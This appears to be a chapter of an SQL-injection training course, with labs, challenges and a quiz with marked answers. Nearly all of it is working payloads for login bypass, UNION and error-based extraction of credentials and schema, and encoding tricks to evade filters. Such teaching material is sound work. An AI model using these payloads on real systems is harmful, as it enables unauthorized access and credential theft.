# 🎯 Chapter 4: Basic SQL Injection Techniques

## Authentication Bypass

The most common SQL injection attack: bypassing login forms.

### Technique 1: Comment-Based Bypass

**Target Query:**
```sql
SELECT * FROM users WHERE username='INPUT' AND password='INPUT'
```

**Attack Payloads:**
```sql
-- Payload 1: Comment out password check
Username: admin' --
Password: anything

Result: SELECT * FROM users WHERE username='admin' -- ' AND password='anything'

-- Payload 2: Hash comment (MySQL)
Username: admin' #
Password: anything

Result: SELECT * FROM users WHERE username='admin' # ' AND password='anything'

-- Payload 3: Multi-line comment
Username: admin' /*
Password: */ OR '1'='1

Result: SELECT * FROM users WHERE username='admin' /* ' AND password=' */ OR '1'='1'
```

### Technique 2: OR-Based Bypass

**Attack Payloads:**
```sql
-- Always true condition
Username: ' OR '1'='1
Password: ' OR '1'='1

Result: SELECT * FROM users WHERE username='' OR '1'='1' AND password='' OR '1'='1'

-- OR with comment
Username: ' OR 1=1 --
Password: anything

Result: SELECT * FROM users WHERE username='' OR 1=1 -- ' AND password='anything'
```

### Technique 3: Tautology-Based Bypass

```sql
-- Always true statements
' OR 'x'='x
' OR 'a'='a
') OR ('1'='1
admin' OR '1'='1' --
```

## Data Extraction

### UNION-Based Injection

**Step 1: Find number of columns**

```sql
' ORDER BY 1 --
' ORDER BY 2 --
' ORDER BY 3 --
' ORDER BY 4 -- (if error, 3 columns exist)
```

**Step 2: Find vulnerable columns**

```sql
' UNION SELECT NULL, NULL, NULL --
' UNION SELECT 1, 2, 3 --
' UNION SELECT 'a', 'b', 'c' --
```

**Step 3: Extract data**

```sql
-- Get database version
' UNION SELECT NULL, @@version, NULL --

-- Get current database
' UNION SELECT NULL, database(), NULL --

-- Get user
' UNION SELECT NULL, user(), NULL --

-- List tables
' UNION SELECT NULL, table_name, NULL FROM information_schema.tables --

-- List columns
' UNION SELECT NULL, column_name, NULL FROM information_schema.columns WHERE table_name='users' --

-- Extract user data
' UNION SELECT NULL, username, password FROM users --
```

### Error-Based Injection

Force database errors to reveal information:

```sql
-- MySQL
' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT((SELECT database()), 0x3a, FLOOR(RAND()*2)) AS x FROM information_schema.tables GROUP BY x) y) --

-- Extract table names
' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT((SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1), 0x3a, FLOOR(RAND()*2)) AS x FROM information_schema.tables GROUP BY x) y) --
```

## Lab Exercise 4.1: Authentication Bypass

**Objective:** Bypass login on the vulnerable page

**Tasks:**
1. Open `/vulnerable/login.php`
2. Try each bypass technique
3. Document successful payloads
4. Explain why each worked

**Example Solutions:**

```
Test 1: Comment Bypass
Username: admin' --
Password: (empty)
Result: ✅ Success - Logged in as admin
Explanation: Comment terminated the query after username check

Test 2: OR Bypass
Username: ' OR '1'='1
Password: ' OR '1'='1
Result: ✅ Success - Logged in as first user
Explanation: OR condition made entire WHERE clause true

Test 3: Combined
Username: admin' OR '1'='1' --
Password: anything
Result: ✅ Success - Logged in as admin
Explanation: OR true + comment eliminated password check
```

## Lab Exercise 4.2: UNION Injection

**Objective:** Extract data using UNION

**Setup:** Vulnerable search page (if available)

**Steps:**

1. **Determine column count:**
```
' ORDER BY 1 --
' ORDER BY 2 --
' ORDER BY 3 --
```

2. **Identify injectable columns:**
```
' UNION SELECT NULL, NULL --
' UNION SELECT 'A', 'B' --
```

3. **Extract database info:**
```
' UNION SELECT database(), user() --
```

4. **List tables:**
```
' UNION SELECT table_name, NULL FROM information_schema.tables WHERE table_schema=database() --
```

5. **Extract user data:**
```
' UNION SELECT username, password FROM users --
```

## Real-World Attack Scenarios

### Scenario 1: E-commerce Site

**Vulnerable search:**
```php
$search = $_GET['q'];
$query = "SELECT * FROM products WHERE name LIKE '%$search%'";
```

**Attack:**
```
?q=' UNION SELECT username, password, email FROM users --
```

**Result:** Attacker extracts all user credentials

### Scenario 2: Blog Comments

**Vulnerable code:**
```php
$comment_id = $_GET['id'];
$query = "SELECT * FROM comments WHERE id = $comment_id";
```

**Attack:**
```
?id=1 UNION SELECT username, password, NULL, NULL FROM admin_users
```

**Result:** Admin credentials exposed

### Scenario 3: User Profile

**Vulnerable code:**
```php
$username = $_GET['user'];
$query = "SELECT * FROM profiles WHERE username = '$username'";
```

**Attack:**
```
?user=admin' UNION SELECT table_name, column_name, NULL FROM information_schema.columns --
```

**Result:** Database schema revealed

## Advanced Bypass Techniques

### Case Variation
```sql
AdMiN' --
aDmIn' Or '1'='1
```

### Whitespace Variations
```sql
admin'--
admin'%20--
admin'/**/--
admin'%0A--
```

### Encoding
```sql
-- URL encoding
admin%27%20--

-- Double URL encoding
admin%2527%2520--

-- Hex encoding
admin' -- → 0x61646d696e27202d2d
```

### Null Byte Injection
```sql
admin'%00--
```

## Practice Challenges

### Challenge 1: Basic Bypass
**Difficulty:** ⭐ Easy

```php
$query = "SELECT * FROM users WHERE username='$user' AND password='$pass'";
```

**Goal:** Login without knowing password

<details>
<summary>Solution</summary>

```
Username: admin' --
Password: anything
```
</details>

### Challenge 2: Multiple Conditions
**Difficulty:** ⭐⭐ Medium

```php
$query = "SELECT * FROM users WHERE username='$user' AND password='$pass' AND status='active'";
```

**Goal:** Login as admin

<details>
<summary>Solution</summary>

```
Username: admin' --
Password: anything

OR

Username: admin' AND '1'='1
Password: ' OR '1'='1' --
```
</details>

### Challenge 3: UNION Extraction
**Difficulty:** ⭐⭐⭐ Hard

```php
$query = "SELECT id, title, content FROM articles WHERE id = $id";
```

**Goal:** Extract all usernames and passwords

<details>
<summary>Solution</summary>

```
Step 1: Determine columns
?id=1 ORDER BY 1 --
?id=1 ORDER BY 2 --
?id=1 ORDER BY 3 --
?id=1 ORDER BY 4 -- (error = 3 columns)

Step 2: Extract data
?id=1 UNION SELECT username, password, email FROM users --
```
</details>

## Key Takeaways

- ✅ Comment-based bypass is the simplest technique
- ✅ OR conditions create always-true statements
- ✅ UNION allows data extraction from other tables
- ✅ ORDER BY helps determine column count
- ✅ information_schema reveals database structure

## Quiz: Chapter 4

### Question 1
What does `--` do in SQL injection?
- A) Subtracts values
- B) Comments out remaining query ✅
- C) Divides numbers
- D) Nothing

### Question 2
How to find column count?
- A) UNION SELECT 1
- B) ORDER BY n ✅
- C) COUNT(*)
- D) SELECT columns

### Question 3
What reveals database tables?
- A) information_schema ✅
- B) show_tables()
- C) get_tables
- D) list_db

---

**[← Previous: Chapter 3](03-vulnerability-identification.md)** | **[Next: Chapter 5 →](05-defense-mechanisms.md)**